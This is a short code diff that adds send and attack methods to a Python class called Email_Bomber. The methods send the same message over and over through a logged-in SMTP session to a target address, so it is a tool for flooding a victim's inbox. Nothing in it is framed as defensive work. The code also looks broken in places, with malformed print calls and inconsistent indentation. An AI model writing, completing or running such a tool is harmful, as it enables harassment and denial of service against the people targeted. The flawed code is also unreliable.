@@ -108,3 +108,18 @@ class Email_Bomber:
             self.s.login(self.fromAddr, self.fromPwd)
         except Exception as e:
             print(f,'ERROR: {e}')
+  def send(self):
+        try:
+            self.s.sendmail(self.fromAddr, self.target, self.msg)
+            self.count +=1
+            print(bcolors.YELLOW + 'BOMB: {self.count}')
+        except Exception as e:
+            print(f,'ERROR: {e}')
+
+    def attack(self):
+        print(bcolors.RED + '\n+[+[+[ Attacking... ]+]+]+')
+        for email in range(self.amount+1):
+            self.send()
+        self.s.close()
+        print(bcolors.RED + '\n+[+[+[ Attack finished ]+]+]+')
+        sys.exit(0)
